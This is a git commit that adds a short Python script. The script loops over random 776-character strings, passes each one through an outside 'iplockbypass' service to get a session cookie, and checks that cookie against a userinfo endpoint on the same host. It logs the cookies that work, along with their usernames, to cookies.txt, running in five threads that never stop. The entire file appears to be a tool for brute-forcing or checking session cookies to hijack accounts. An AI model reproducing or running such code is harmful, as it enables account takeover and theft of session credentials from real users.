b9755caf46e2507d53b1916e042000bd98fe625e
Mohammed8339 <49081161+Mohammed8339@users.noreply.github.com>
2022-07-25 23:50:35 -0400

    Add files via upload

---
+++ main.py
@@ -0,0 +1,37 @@
+import requests, json, re
+import random, string
+import threading
+from bs4 import BeautifulSoup
+
+
+def process():
+   while True:
+      valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+      rancookie = ''.join((random.choice(valid_letters) for i in range(776)))
+
+      cookie = requests.get(f"https://story-of-jesus.xyz/iplockbypass?cookie={rancookie}").text
+      r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
+      data = r.json()
+
+      if data["status"] == "failed":
+         falsecookie = rancookie[:29]
+         print("[INVALID] " + falsecookie + "...")
+
+      else:
+         falsecookie = rancookie[:9]
+         print(f"[VALID]" + falsecookie + f" {data['username']} And Logged To File.")
+         f = open("cookies.txt", "a")
+         f.write(cookie + "\n")
+         f.close()
+
+t1 = threading.Thread(target=process)
+t2 = threading.Thread(target=process)
+t3 = threading.Thread(target=process)
+t4 = threading.Thread(target=process)
+t5 = threading.Thread(target=process)
+
+t1.start()
+t2.start()
+t3.start()
+t4.start()
+t5.start()
